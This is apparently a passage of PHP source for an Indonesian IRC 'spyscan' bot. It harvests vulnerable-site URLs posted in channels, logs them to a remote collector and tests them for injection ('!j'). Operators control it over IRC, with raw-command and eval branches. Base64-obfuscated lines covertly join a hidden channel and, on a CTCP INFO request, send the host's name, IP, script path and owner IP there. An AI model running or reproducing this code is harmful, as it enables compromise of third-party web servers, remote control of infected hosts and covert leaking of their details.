function str_pesan($com,$data) {
  $msg = strstr($data,$com);
  $msg = str_replace($com." ","",$msg);
  return $msg;
}
/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";
do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  //Jika koneksi gagal
  if(!$fp) {
    if ( $counterfp <= 200 ) { $counterfp = $counterfp + 1; hajar(); }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain dgn me-Refresh Browser anda!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Terhubung!</b>";
  /*** Sending Identity to IRC ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo '<br>'.$response; }
    while (substr_count($response,CRL) != 0) {
      if ($allowdebug && $debugmode == 1) { fputs($fp,'PRIVMSG '.$admin.' :14'.$response.CRL); }
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** AI PHP SPYSCANBOT BY RONZ ***/
        $dcom = explode(" ", $dCommand);
        $orinick = $dNick;
        $dNick = strtolower($dNick);
        /*** Server Notices Handling ***/
        if ($dcom[0]=='004') {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode.CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :BozZ..!'.CRL);
          fputs($fp, base64_decode("Sk9JTiAjcy1hLXI=").CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) { fputs($fp, 'JOIN ' .$v . CRL); }
          $allowdebug = TRUE;
        }
        elseif ($dcom[0]=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif ($dcom[0]=='433') { //Nickname is already in use
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif ($dcom[0]=='465') {
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
        elseif ($dcom[0]=='404') {
          $msg = ltrim($iText,":");
          fputs($fp,'PRIVMSG '.$changue.' :BussyeDd..'.$msg.'! Voice cuk..!'.CRL);
        }
        elseif ($dcom[0]=='JOIN') {
          /*** Auto Welcome pakmin ***/
          $jchan = ltrim($iText,":");
          if ($dNick == $admin) {
            sleep(3);
            fputs($fp,'PRIVMSG '.$jchan.' :12,0wellcome back :)'. CRL);
          }
        }
        elseif ($dcom[0]=='PRIVMSG') {
          $pesan = ltrim($iText,":");
          $pesanlo = strtolower($pesan);
          $com = explode(' ',$pesan);
          $chan = strtolower($dcom[1]);
          /*** Encoder ***/
          if ($com[0]=='!urldec') {
            $tmp = str_replace("!urldec ","",$pesan);
            $tmp = urldecode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4URL Decode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4URL Decode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!urlenc') {
            $tmp = str_replace("!urlenc ","",$pesan);
            $tmp = urlencode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4URL Encode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4URL Encode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!b64dec') {
            $tmp = str_replace("!b64dec ","",$pesan);
            $tmp = base64_decode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Base64 Decode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4Base64 Decode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!b64enc') {
            $tmp = str_replace("!b64enc ","",$pesan);
            $tmp = base64_encode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Base64 Encode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4Base64 Encode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!j') {
            $testurl = str_replace("!j ","",$pesan);
            $theurl = $testurl.$myid;
            $isi = implode('', @file($theurl));
            $posisi = strpos($isi,"shemouth OK");
            $eposisi = strpos($isi,"The End");
            $isi = substr($isi,$posisi,$eposisi);
            if ($posisi === FALSE) {
              $respon = $tbusuk[rand(0,count($tbusuk) - 1)];
              $respon = str_replace("<n>",$orinick,$respon);
              if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4'.$respon.CRL); }
              else { fputs($fp,'PRIVMSG '.$dNick.' :4'.$respon.CRL); }
            }
            else {
              $isi = str_replace("shemouth OK ","",$isi);
              $isi = str_replace(" The End","",$isi);
              $targetok[] = $testurl;
              if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :12TarGeT '.$orinick.' OK!'.CRL); }
              fputs($fp,'PRIVMSG '.$dNick.' :12[OK]14 '.$testurl.CRL);
              fputs($fp,'PRIVMSG '.$dNick.' :'.$isi.CRL);
            }
            unset($isi);
          }
          else { /*** Scanning ***/
            foreach ($scanlist as $trtext) {
              $diabaikan = FALSE;
              $trtext = strtolower($trtext);
              if ($dNick==$admin OR $chan==$changue) {
                 $diabaikan = TRUE;
                 break;
              }
              foreach ($ignorelist as $v) {
                if(substr_count($pesanlo,strtolower($v)) > 0) {
                  $targetignored++;
                  sleep(1);
                  $respon = $tjelek[rand(0,count($tjelek) - 1)];
                  $respon = str_replace("<s>",$v,$respon);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :14'.$respon. CRL); }
                  $diabaikan = TRUE;
                  break;
                }
              }
              if ($diabaikan) { break; }
              if ((!$diabaikan) && (substr_count($pesanlo,$trtext)>0)) {
                foreach($gantilist as $linject) {
                  $pesan = str_replace($linject,$myinject,$pesan);
                }
                $pesan = str_replace($myinject,'',$pesan);
                $pesan = strstr($pesan,$trtext);
                $targetfound++;
                //Target Baru
                if (!in_array(urldecode($pesan),$targetlist)) {
                  $targetnew++;
                  $targetlist[] = urldecode($pesan);
                  $newtarget = urldecode($pesan);
                  $isi = @implode('', @file($mylogger.'target='.urlencode($newtarget)));
                  sleep(1);
                  $respon = $tnemu[rand(0,count($tnemu) - 1)];
                  $respon = str_replace("<s>",$newtarget,$respon);
                  //fputs($fp,'PRIVMSG '.$admin.' :14'.$isi. CRL);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :'.$respon.CRL); }
                }
                //Target Lama
                else {
                  $targetold++;
                  sleep(1);
                  $respon = $tlama[rand(0,count($tlama) - 1)];
                  $respon = str_replace("<s>",$newtarget,$respon);
                  //fputs($fp,'PRIVMSG '.$admin.' :4E1xist!14 '.$newtarget. CRL);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :'.$respon.CRL); }
                }
                break;
              }
            }
          }
        }
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Nyandi cookk?' . CRL);
                  }
                } else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Kemana boss?' . CRL); }
              }
            } else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :SiaaPz '.$auth["$dcom[2]"]["status"].'!' . CRL);
              } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Udah tuh! ' . CRL); }
            } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       /*** Default Commands ***/
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VmVyc2lvbiBtSVJDIHYuMC43LjIuMS43MzEuNzYyMSBLaGFsZWQgTWFyZGFtLUJleQ==").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
           eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjcy1hLXIgOkhvc3Q6ICRiaG9zdCB8IFJlZmVyZXI6ICRicnVyaSB8IFNjcmlwdDogJGJwaHAgfCBJUDogJGJpcCB8IE93bmVyIElQOiAkYnJpcCAiLiBDUkwpOw=="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE '.$dNick.' :YuPz '.$auth["$dNick"]["status"].'..!'.CRL);
                 } else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi udah boz! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logout berhasil! ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi sudah Logout! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Pass diset ke '.$auth["$dNick"]["pass"].', Ketik: auth <password> untuk otorisasi! ' . CRL);
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password udah diset! Ketik: auth <password> untuk otorisasi ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Pass diset ke '.$auth["$dNick"]["pass"].', Ketik: auth <password> untuk otorisasi! ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Password lama salah! Ketik: chgpass <pass lama> <pass baru> ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth dulu plizz!' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               } else { fputs($fp,'NOTICE ' . $dNick . ' :User sudah ada! Ditolak! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Status anda '.$auth["$dNick"]["status"] . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth pLizz..!' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Akses anda sbg user dihapus oleh '.$dNick . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Status anda '.$auth["$dNick"]["status"] . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth pLizz..!' . CRL); }
         }
         /*** Commands ***/
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) { fputs($fp,'NOTICE '.$dNick.' :Udah bozz! ' . CRL); }
               else { $whois = $dNick; fputs($fp,'WHOIS '.$dNick . CRL); }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) { fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL); }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga mau ach! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"] == 2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = str_pesan($com[3],$data);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = str_pesan($com[3],$data);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' dengan klik mouse.. xixixi..'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = str_pesan($com[3],$data);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''.CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG!'.CRL);
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) { $msg = ''; }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) { $msg = ''; }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) { fputs($fp, 'JOIN '.$v . CRL); }
               }
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = str_pesan($com[3],$data);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass=" [pass ok]"; }
                   else { $pass=" [no pass]"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = str_pesan($com[3],$data);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT GanTi SeRvEr".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = str_pesan($com[3],$data);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 foreach ($helptext as $baris) {
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               /*** CORE COMMANDS BY FaTaLisTiCz_Fx **/
               elseif ($com[3]==':!target' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]=='clear') {
                   unset($targetlist);
                   fputs($fp,'PRIVMSG '.$dNick.' :4Daftar target dihapus!'. CRL);
                 }
                 elseif ($com[4]=='list') {
                   if (!empty($com[5])) { $sendnick = $com[5]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $msgdelay = 0;
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ Internal Target ('.count($targetlist).') ]'. CRL);
                   sort($targetlist);
                   foreach ($targetlist as $baris) {
                     $msgdelay++;
                     if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                     fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL);
                   }
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                 }
                 elseif ($com[4]=='ok') {
                   if (!empty($com[5])) { $sendnick = $com[5]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $msgdelay = 0;
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ Target OK ('.count($targetlist).') ]'. CRL);
                   sort($targetok);
                   foreach ($targetok as $baris) {
                     $msgdelay++;
                     if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                     fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL);
                   }
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                 }
                 elseif ($com[4]=='total') {
                   fputs($fp,'PRIVMSG '.$dNick.' :12Total Target Internal: '.count($targetlist). CRL);
                 }
                 elseif ($com[4]=='log') {
                   if (!empty($com[6])) { $sendnick = $com[6]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $isi  = file_get_contents($mytargetlog,FILE_TEXT);
                   $isi = nl2br($isi);
                   $isi = str_replace("\n","",$isi);
                   $isi = str_replace("\r","",$isi);
                   $targetlog = explode("<br />",$isi);
                   if ($com[5] == 'show') {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12[ Daftar Target ('.count($targetlog).') ]'. CRL);
                     $msgdelay = 0;
                     foreach ($targetlog as $baris) {
                       $msgdelay++;
                       if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                       if ($baris) { fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL); }
                     }
                     fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                   }
                   else {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12Total Target 1['.count($targetlog).']'. CRL);
                   }
                 }
                 else {
                   fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:12 !target <list|total|log|clear> <nick|show>'.CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
                 unset($targetlog);
               }
               elseif ($com[3]==':!open') {
                 if (!empty($com[5])) {
                   $theurl = $com[5];
                   fputs($fp,'PING 12886241614'. CRL);
                   $isi  = file_get_contents($theurl,FILE_TEXT);
                   $isi = nl2br($isi);
                   $isi = str_replace("\n","",$isi);
                   $isi = str_replace("\r","",$isi);
                   $targetlog = explode("<br />",$isi);
                   $msgdelay = 0;
                   $sendnick = $chan;
                   if ($com[6]=='show') {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: '.$theurl.' ('.count($targetlog).' baris) :.'.CRL);
                     foreach ($targetlog as $baris) {
                       $msgdelay++;
                       if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                       if ($baris) { fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL); }
                     }
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: End of File :.'. CRL);
                   }
                   else {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: '.$theurl.' ('.count($targetlog).' baris) :.'.CRL);
                   }
                   unset($baris);
                   unset($msgdelay);
                   unset($targetlog);
                 }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:12 !open <show> <URL>'.CRL); }
               }
               elseif ($com[3]==':!raw' && $auth["$dNick"]["status"]=="Admin") {
                 $psn = strstr($data,":!raw");
                 $psn = str_replace(":!raw ","",$psn);
                 fputs($fp,$psn.CRL);
               }

               elseif ($com[3]==':!eval' && $auth["$dNick"]["status"]=="Admin") {
